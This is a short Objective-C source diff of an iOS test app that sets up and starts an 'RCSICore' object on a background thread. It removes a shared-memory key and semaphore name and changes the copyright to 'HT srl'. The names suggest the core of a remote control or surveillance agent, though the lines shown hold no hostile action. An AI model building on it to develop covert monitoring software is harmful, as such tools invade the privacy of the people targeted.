@@ -3,7 +3,7 @@
 //  ios-test-app
 //
 //  Created by kiodo on 24/03/12.
-//  Copyright 2012 __MyCompanyName__. All rights reserved.
+//  Copyright 2012 HT srl. All rights reserved.
 //
 
 #import "ios_test_appAppDelegate.h"
@@ -57,15 +57,11 @@ void asciiToHex(char *string, char *binary)
 {
   //configurationFileName: "b2YC6yY6CFcc";
   
-  int shMemKey  = 31337;
   int shMemSize = SHMEM_COMMAND_MAX_SIZE;
-  NSString *semaphoreName = @"SUX";
   
   [self setGlobalVars];
   
-  RCSICore *core = [[RCSICore alloc] initWithKey: shMemKey
-                                sharedMemorySize: shMemSize
-                                   semaphoreName: semaphoreName];
+  RCSICore *core = [[RCSICore alloc] initWithShMemorySize: shMemSize];
                                   
   [NSThread detachNewThreadSelector:@selector(runMeh) toTarget:core withObject:nil];
   
